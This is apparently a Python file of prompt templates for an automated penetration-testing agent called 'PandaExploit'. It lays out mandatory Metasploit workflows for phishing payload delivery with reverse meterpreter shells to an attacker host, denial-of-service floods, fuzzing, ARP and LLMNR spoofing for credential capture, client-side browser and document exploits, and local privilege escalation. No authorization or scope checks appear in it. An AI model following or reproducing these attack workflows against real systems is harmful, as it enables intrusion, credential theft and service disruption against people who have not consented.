"""
PandaExploit Remaining Attack Path Prompts

Social engineering, DoS, fuzzing, wireless, client-side, local privilege escalation.
"""

# =============================================================================
# SOCIAL ENGINEERING
# =============================================================================

SOCIAL_ENGINEERING_TOOLS = """
## ATTACK PATH: SOCIAL ENGINEERING / PHISHING

**CRITICAL: This objective has been CLASSIFIED as social engineering.**
**Uses: web_delivery, HTA, malicious documents, multi/handler.**

---

## MANDATORY SOCIAL ENGINEERING WORKFLOW

### Step 1: Set up payload handler
- `use exploit/multi/handler`
- `set PAYLOAD windows/meterpreter/reverse_tcp` (or linux/x64/meterpreter_reverse_tcp)
- `set LHOST <attacker_ip>` `set LPORT <port>`
- `exploit -j`

### Step 2: Generate delivery mechanism
- **Web delivery:** `use exploit/multi/script/web_delivery` — TARGET 0=Python, 1=PHP, 2=PowerShell, 3=Regsvr32
- **HTA server:** `use exploit/windows/misc/hta_server` — Serves malicious HTA
- **Malicious Office:** `use exploit/multi/fileformat/office_word_macro` — Generates .doc with macro

### Step 3: Deliver and wait
- Output one-liner or URL to victim
- Victim executes/visits → callback to handler
- **NO post-exploitation until session opens**
"""

# =============================================================================
# DENIAL OF SERVICE (DoS)
# =============================================================================

DOS_TOOLS = """
## ATTACK PATH: DENIAL OF SERVICE (DoS)

**CRITICAL: This objective has been CLASSIFIED as DoS.**
**Uses: auxiliary/dos/* modules. NO post-exploitation — mark complete after run.**

---

## MANDATORY DoS WORKFLOW

### Step 1: Select DoS module
| Type | Module |
|------|--------|
| HTTP Slowloris | `use auxiliary/dos/http/slowloris` |
| HTTP Apache Range | `use auxiliary/dos/http/apache_range_dos` |
| TCP SYN Flood | `use auxiliary/dos/tcp/synflood` |
| UDP Flood | `use auxiliary/dos/udp/udp_flood` |
| RDP MS12-020 | `use auxiliary/dos/windows/rdp/ms12_020_maxchannelids` |

### Step 2: Configure and run
- `set RHOSTS <target>` `set RPORT <port>`
- `run` (NOT exploit)
- **Mark complete after run — no session, no post-exploitation**
"""

# =============================================================================
# FUZZING
# =============================================================================

FUZZING_TOOLS = """
## ATTACK PATH: FUZZING / VULNERABILITY DISCOVERY

**CRITICAL: This objective has been CLASSIFIED as fuzzing.**
**Uses: auxiliary/fuzzers/*. Sends malformed input to discover crashes.**

---

## MANDATORY FUZZING WORKFLOW

### Step 1: Select fuzzer
| Protocol | Module |
|----------|--------|
| HTTP | `use auxiliary/fuzzers/http/http_form_field` or `http_cookie` |
| FTP | `use auxiliary/fuzzers/ftp/ftp_pre_post` |
| SSH | `use auxiliary/fuzzers/ssh/ssh_kexinit_corrupt` |
| SMB | `use auxiliary/fuzzers/smb/smb_negotiate_corrupt` |
| DNS | `use auxiliary/fuzzers/dns/dns_fuzzer` |

### Step 2: Configure and run
- `set RHOSTS <target>` `set RPORT <port>`
- Optional: STARTSIZE, ENDSIZE, FIELDS (module-specific)
- `run` — Monitor target for crashes
- **If crash found → research CVE → switch to cve_exploit path**
"""

# =============================================================================
# WIRELESS / NETWORK
# =============================================================================

WIRELESS_TOOLS = """
## ATTACK PATH: WIRELESS / NETWORK ATTACKS

**CRITICAL: This objective has been CLASSIFIED as wireless/network.**
**Uses: ARP spoofing, NBNS/LLMNR spoofing, credential capture.**

---

## MANDATORY WIRELESS WORKFLOW

### Step 1: ARP poisoning (MITM)
- `use auxiliary/spoof/arp/arp_poisoning`
- `set INTERFACE eth0` (or target interface)
- `set DHOSTS <victim_ip>` `set SHOSTS <gateway_ip>`
- `set BIDIRECTIONAL true`
- `run -j`

### Step 2: Name resolution spoofing (optional)
- NBNS: `use auxiliary/spoof/nbns/nbns_response`
- LLMNR: `use auxiliary/spoof/llmnr/llmnr_response`
- Combine with credential capture for hash harvesting
"""

# =============================================================================
# CLIENT-SIDE EXPLOIT
# =============================================================================

CLIENT_SIDE_EXPLOIT_TOOLS = """
## ATTACK PATH: CLIENT-SIDE EXPLOITATION

**CRITICAL: This objective has been CLASSIFIED as client-side.**
**Requires victim to visit URL or open document. Uses browser/file exploits.**

---

## MANDATORY CLIENT-SIDE WORKFLOW

### Step 1: Set up handler first
- `use exploit/multi/handler`
- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `set LHOST` `set LPORT`
- `exploit -j`

### Step 2: Select client exploit
- **Browser:** `search type:exploit platform:windows target:browser`
- **Java:** `use exploit/multi/browser/java_*`
- **IE:** `use exploit/windows/browser/ie_*`
- **Document:** `use exploit/windows/fileformat/adobe_*` or `office_*`

### Step 3: Configure and exploit
- `set SRVHOST` `set SRVPORT` (for web delivery)
- `set LHOST` `set LPORT` (callback)
- `exploit -j` — Output: URL or file to send to victim
- **Wait for victim to trigger**
"""

# =============================================================================
# LOCAL PRIVILEGE ESCALATION
# =============================================================================

LOCAL_PRIVILEGE_ESCALATION_TOOLS = """
## ATTACK PATH: LOCAL PRIVILEGE ESCALATION

**CRITICAL: This objective has been CLASSIFIED as local privilege escalation.**
**Prerequisite: Already have a Meterpreter/shell session.**

---

## MANDATORY LOCAL PRIVESC WORKFLOW

### Option A: Windows getsystem
- In Meterpreter: `getsystem` (uses built-in techniques)

### Option B: Local exploit module
- `background` (background current session)
- `search type:exploit platform:linux local` or `platform:windows local`
- `use exploit/linux/local/dirty_pipe` (or appropriate module)
- `set SESSION <id>` `set LHOST` `set LPORT`
- `exploit`

### Option C: Exploit suggester
- `run post/multi/recon/local_exploit_suggester`
- Review suggested exploits, run appropriate one

**Must have active session before attempting.**
"""
